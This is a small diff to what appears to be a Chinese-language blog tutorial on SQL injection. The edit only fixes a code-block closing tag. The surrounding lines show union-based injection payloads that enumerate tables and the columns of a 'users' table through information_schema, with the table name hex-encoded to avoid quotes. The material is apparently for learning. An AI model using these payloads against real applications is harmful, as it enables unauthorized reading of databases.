@@ -44,7 +44,7 @@ union select 1, group_concat(table_name) from information_schema.tables where ta
 
 {% highlight sql %}
 union select 1,group_concat(column_name) from information_schema.columns where table_name=0x7573657273+--+&Submit=Submit
-{% highlight sql %}
+{% endhighlight %}
 
 其中`0x7573657273`为`users`的十六进制形式
 
